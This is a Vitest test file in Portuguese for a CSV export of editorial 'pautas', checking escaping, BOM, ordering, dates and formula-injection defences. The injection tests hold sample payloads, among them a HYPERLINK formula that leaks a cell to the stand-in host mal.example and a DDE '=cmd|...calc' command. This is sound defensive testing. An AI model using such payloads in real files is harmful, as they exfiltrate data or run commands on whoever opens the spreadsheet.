import { describe, expect, it } from 'vitest';
import {
  gerarCsvPautas,
  nomeArquivoCsv,
  type OficioExportavel,
  type PautaExportavel,
} from './exportar';

const BOM = '\uFEFF';

/**
 * Um ofício de teste com rótulos que não existem em nenhum ofício real. É de
 * propósito: se algum dia alguém trocar `campo1Label` por "Canal" fixo no
 * código, estes testes quebram — que é exatamente o trabalho deles.
 */
const OFICIO: OficioExportavel = {
  campo1Label: 'Canal',
  campo2Label: 'Formato',
  solo: false,
  etapas: [
    { id: 'e1', nome: 'Ideia' },
    { id: 'e2', nome: 'Em produção' },
    { id: 'e3', nome: 'Publicado' },
  ],
};

function pauta(parcial: Partial<PautaExportavel> = {}): PautaExportavel {
  return {
    titulo: 'Pauta qualquer',
    campo1: null,
    campo2: null,
    prazo: null,
    etapaId: 'e1',
    responsavelId: null,
    ...parcial,
  };
}

/** As linhas do arquivo, já sem o BOM. */
function linhasDe(csv: string): string[] {
  return csv.replace(BOM, '').split('\r\n');
}

describe('gerarCsvPautas — cabeçalho', () => {
  it('tira os rótulos dos campos livres do ofício, não de string fixa', () => {
    const csv = gerarCsvPautas({ pautas: [], oficio: OFICIO });
    expect(linhasDe(csv)[0]).toBe('"Etapa","Título","Canal","Formato","Prazo"');
  });

  it('acompanha um ofício com outros rótulos sem mudar de código', () => {
    const ti: OficioExportavel = { ...OFICIO, campo1Label: 'Sprint', campo2Label: 'Repo' };
    expect(linhasDe(gerarCsvPautas({ pautas: [], oficio: ti }))[0]).toContain('"Sprint","Repo"');
  });

  it('gera só o cabeçalho quando não há pauta nenhuma', () => {
    // Arquivo de zero byte parece defeito; cabeçalho sozinho diz "está vazio".
    expect(linhasDe(gerarCsvPautas({ pautas: [], oficio: OFICIO }))).toHaveLength(1);
  });

  it('acrescenta Responsável só quando há equipe e o ofício não é solo', () => {
    const membros = [{ userId: 'u1', nome: 'Ana Clara' }];

    expect(linhasDe(gerarCsvPautas({ pautas: [], oficio: OFICIO, membros }))[0]).toContain(
      '"Responsável"',
    );
    expect(linhasDe(gerarCsvPautas({ pautas: [], oficio: OFICIO }))[0]).not.toContain(
      '"Responsável"',
    );
    expect(
      linhasDe(gerarCsvPautas({ pautas: [], oficio: { ...OFICIO, solo: true }, membros }))[0],
    ).not.toContain('"Responsável"');
  });
});

describe('gerarCsvPautas — escape', () => {
  it('dobra as aspas de dentro do campo', () => {
    const csv = gerarCsvPautas({
      pautas: [pauta({ titulo: 'A série "Bastidores"' })],
      oficio: OFICIO,
    });
    expect(linhasDe(csv)[1]).toContain('"A série ""Bastidores"""');
  });

  it('mantém vírgula dentro do campo sem criar coluna nova', () => {
    const csv = gerarCsvPautas({
      pautas: [pauta({ titulo: 'Roteiro, corte e trilha' })],
      oficio: OFICIO,
    });
    const linha = linhasDe(csv)[1] ?? '';

    expect(linha).toContain('"Roteiro, corte e trilha"');
    // Cinco campos citados — a vírgula do título não virou separador.
    expect(linha.match(/"[^"]*"/g)).toHaveLength(5);
  });

  it('preserva quebra de linha dentro do campo citado', () => {
    const csv = gerarCsvPautas({
      pautas: [pauta({ titulo: 'Linha um\r\nLinha dois' })],
      oficio: OFICIO,
    });

    // O registro é quebrado por CRLF; a quebra de dentro do campo vira \n para
    // não ser confundida com fim de registro por parser distraído.
    expect(linhasDe(csv)).toHaveLength(2);
    expect(csv).toContain('"Linha um\nLinha dois"');
  });

  it('cita todo campo, inclusive os que não precisariam', () => {
    const csv = gerarCsvPautas({ pautas: [pauta({ titulo: 'simples' })], oficio: OFICIO });
    expect(linhasDe(csv)[1]).toBe('"Ideia","simples","","",""');
  });

  it('respeita um separador diferente do padrão', () => {
    const csv = gerarCsvPautas({
      pautas: [pauta({ titulo: 'x' })],
      oficio: OFICIO,
      separador: ';',
    });
    expect(linhasDe(csv)[0]).toBe('"Etapa";"Título";"Canal";"Formato";"Prazo"');
  });
});

describe('gerarCsvPautas — injeção de fórmula', () => {
  // Um título é texto digitado por uma pessoa e aberto por outra. Sem a aspa
  // simples, a planilha executa esse texto. Ver OWASP "CSV Injection".
  it.each([
    ['=HYPERLINK("http://mal.example/"&A1,"clique")', '='],
    ['+1+1', '+'],
    ['-2+3', '-'],
    ['@SUM(A1:A9)', '@'],
    ['\t=1+1', 'tabulação antes do sinal'],
  ])('neutraliza %s (%s)', (titulo) => {
    const csv = gerarCsvPautas({ pautas: [pauta({ titulo })], oficio: OFICIO });
    const linha = linhasDe(csv)[1] ?? '';

    // A célula começa com aspa simples logo depois da aspa de citação.
    expect(linha).toContain(`"'${titulo.replace(/"/g, '""')}"`);
  });

  it('neutraliza também nos campos livres, não só no título', () => {
    const csv = gerarCsvPautas({
      pautas: [pauta({ campo1: '=cmd|\'/c calc\'!A1', campo2: '@fim' })],
      oficio: OFICIO,
    });
    const linha = linhasDe(csv)[1] ?? '';

    expect(linha).toContain('"\'=cmd|\'/c calc\'!A1"');
    expect(linha).toContain('"\'@fim"');
  });

  it('não mexe em texto que apenas contém os sinais no meio', () => {
    const csv = gerarCsvPautas({ pautas: [pauta({ titulo: 'Antes = depois' })], oficio: OFICIO });
    expect(linhasDe(csv)[1]).toContain('"Antes = depois"');
    expect(linhasDe(csv)[1]).not.toContain("'Antes");
  });
});

describe('gerarCsvPautas — acentuação', () => {
  it('começa com o BOM de UTF-8', () => {
    // Sem estes três bytes o Excel no Windows lê Latin-1 e "Revisão" vira
    // "RevisÃ£o".
    expect(gerarCsvPautas({ pautas: [], oficio: OFICIO }).startsWith(BOM)).toBe(true);
  });

  it('mantém os acentos intactos no conteúdo', () => {
    const csv = gerarCsvPautas({
      pautas: [pauta({ titulo: 'Revisão de pauta — ação nº 3', etapaId: 'e2' })],
      oficio: OFICIO,
    });
    expect(csv).toContain('"Revisão de pauta — ação nº 3"');
    expect(csv).toContain('"Em produção"');
  });
});

describe('gerarCsvPautas — campos ausentes', () => {
  it('deixa a célula vazia em vez de escrever "null" ou travessão', () => {
    const csv = gerarCsvPautas({
      pautas: [pauta({ titulo: 'Sem nada', campo1: null, campo2: null, prazo: null })],
      oficio: OFICIO,
    });
    const linha = linhasDe(csv)[1] ?? '';

    expect(linha).toBe('"Ideia","Sem nada","","",""');
    expect(linha).not.toContain('null');
    expect(linha).not.toContain('—');
  });

  it('deixa o responsável vazio quando a pauta não tem dono', () => {
    const csv = gerarCsvPautas({
      pautas: [pauta({ responsavelId: null })],
      oficio: OFICIO,
      membros: [{ userId: 'u1', nome: 'Ana Clara' }],
    });
    expect(linhasDe(csv)[1]?.endsWith('""')).toBe(true);
  });

  it('não inventa nome para um responsável que saiu do workspace', () => {
    const csv = gerarCsvPautas({
      pautas: [pauta({ responsavelId: 'u-desligado' })],
      oficio: OFICIO,
      membros: [{ userId: 'u1', nome: 'Ana Clara' }],
    });
    expect(linhasDe(csv)[1]?.endsWith('""')).toBe(true);
  });

  it('deixa a etapa vazia quando o id não pertence ao ofício', () => {
    const csv = gerarCsvPautas({ pautas: [pauta({ etapaId: 'fantasma' })], oficio: OFICIO });
    expect(linhasDe(csv)[1]?.startsWith('""')).toBe(true);
  });
});

describe('gerarCsvPautas — conteúdo das linhas', () => {
  it('escreve o prazo em formato brasileiro', () => {
    const csv = gerarCsvPautas({ pautas: [pauta({ prazo: '2026-08-20' })], oficio: OFICIO });
    // 20/08, não 19/08: a data é lida como local, nunca como UTC.
    expect(linhasDe(csv)[1]).toContain('"20/08/2026"');
  });

  it('resolve o nome do responsável pelo id', () => {
    const csv = gerarCsvPautas({
      pautas: [pauta({ responsavelId: 'u2' })],
      oficio: OFICIO,
      membros: [
        { userId: 'u1', nome: 'Ana Clara' },
        { userId: 'u2', nome: 'Rebeca Lima' },
      ],
    });
    expect(linhasDe(csv)[1]).toContain('"Rebeca Lima"');
  });

  it('ordena pelas etapas do ofício e preserva a ordem dentro de cada uma', () => {
    const csv = gerarCsvPautas({
      pautas: [
        pauta({ titulo: 'C', etapaId: 'e3' }),
        pauta({ titulo: 'A1', etapaId: 'e1' }),
        pauta({ titulo: 'B', etapaId: 'e2' }),
        pauta({ titulo: 'A2', etapaId: 'e1' }),
      ],
      oficio: OFICIO,
    });

    const titulos = linhasDe(csv)
      .slice(1)
      .map((l) => l.split(',')[1]);
    expect(titulos).toEqual(['"A1"', '"A2"', '"B"', '"C"']);
  });

  it('joga pautas de etapa desconhecida para o fim, sem perdê-las', () => {
    const csv = gerarCsvPautas({
      pautas: [pauta({ titulo: 'órfã', etapaId: 'fantasma' }), pauta({ titulo: 'normal' })],
      oficio: OFICIO,
    });

    const linhas = linhasDe(csv);
    expect(linhas).toHaveLength(3);
    expect(linhas[2]).toContain('"órfã"');
  });

  it('não altera o array recebido', () => {
    const lista = [pauta({ titulo: 'B', etapaId: 'e2' }), pauta({ titulo: 'A', etapaId: 'e1' })];
    gerarCsvPautas({ pautas: lista, oficio: OFICIO });
    expect(lista[0]?.titulo).toBe('B');
  });
});

describe('nomeArquivoCsv', () => {
  const DIA = new Date(2026, 7, 24); // 24 de agosto de 2026

  it('tira acento e espaço do título do quadro', () => {
    expect(nomeArquivoCsv('Pauta de conteúdo', DIA)).toBe('pauta-de-conteudo-2026-08-24.csv');
  });

  it('não deixa hífen sobrando nas pontas', () => {
    expect(nomeArquivoCsv('  Minha semana!  ', DIA)).toBe('minha-semana-2026-08-24.csv');
  });

  it('tem um nome de reserva quando o título não sobrevive à limpeza', () => {
    expect(nomeArquivoCsv('★★★', DIA)).toBe('pautas-2026-08-24.csv');
  });

  it('zera à esquerda mês e dia', () => {
    expect(nomeArquivoCsv('x', new Date(2026, 0, 5))).toBe('x-2026-01-05.csv');
  });
});
